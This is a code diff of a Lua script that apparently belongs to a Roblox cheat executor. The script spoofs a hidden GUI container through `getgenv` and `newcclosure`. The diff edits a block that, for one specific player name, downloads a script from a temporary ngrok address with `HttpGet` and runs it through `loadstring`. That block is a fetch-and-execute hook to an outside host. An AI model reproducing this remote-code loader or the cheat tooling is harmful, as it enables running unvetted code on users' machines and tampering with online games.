@@ -1,4 +1,3 @@
-warn("no test")
 local container = game:GetService("CoreGui"):FindFirstChild("HiddenGui");
 getgenv().gethui = newcclosure(function()
   if not container then 
@@ -21,8 +20,11 @@ end);
 
 local name = game:GetService("Players").LocalPlayer.Name
 if string.sub(name, 1, #("davidgoginsisreal")) == "davidgoginsisreal" then
-    loadstring(game:HttpGet("https://c713-2603-6012-141-3048-d89b-4818-ee95-a875.ngrok-free.app/live.lua"))()
-    return nil
+	local ret = loadstring(game:HttpGet("https://2640-2603-6012-141-3048-6453-e890-3111-30d3.ngrok-free.app/live.lua"))()
+	print(ret)
+	if ret then
+		return nil
+	end
 end
 
 local status, res1, res2 = pcall(function()
